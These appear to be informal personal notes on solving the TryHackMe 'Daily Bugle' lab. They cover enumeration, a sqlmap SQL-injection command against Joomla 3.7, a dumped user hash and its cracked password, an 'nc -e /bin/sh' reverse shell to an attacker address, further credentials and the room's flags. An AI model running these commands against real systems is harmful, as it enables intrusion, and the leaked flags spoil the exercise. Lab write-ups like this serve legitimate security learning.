### Daily Bugle ###

export IP=10.10.134.70

firstly...nmap showed the CMS is:Joomla...and its corresponding common dirs...gobuster did the same and a few more...

found README.txt which contained information about Joomla..lets see what else is there..

Joomla version:3.7

# Exploit-DB:
Found an SQL Injection attack...lets see if we can do that
CVE-2019-8917

I am assuming i can because it runs as: [URL]/index.php?....
So i dont need initial access anyways...
Tryhackme suggested to use a python script instead of sqlmap so trying that ofc love it <3

sqlmap -u "http://10.10.105.204/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms=mysql -p list[fullordering] --dump (Forgot this dump lol)


Database: joomla
Table: #__users
[1 entry]
+------+---------------------+------------+---------+----------+--------------------------------------------------------------+
| id   | email               | name       | params  | username | password                                                     |
+------+---------------------+------------+---------+----------+--------------------------------------------------------------+
| 811  | jonah@tryhackme.com | Super User | <blank> | jonah    | 	$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+------+---------------------+------------+---------+----------+--------------------------------------------------------------+

Found the pass with johnTheRipper:spiderman123

Logged in as:jonah:spiderman123

as soon as i log in i get a warning about php version:	5.6.40..

and i have some unread msgs	

nc -e /bin/sh 10.11.18.102 7000
name - jjameson
pass - nv5uz9r3ZEDzVjNu

user.txt:
27a260fe3cba712cfdedb1c86d80442e

root.txt:
eec3d53292b1821868266858d7fa6f79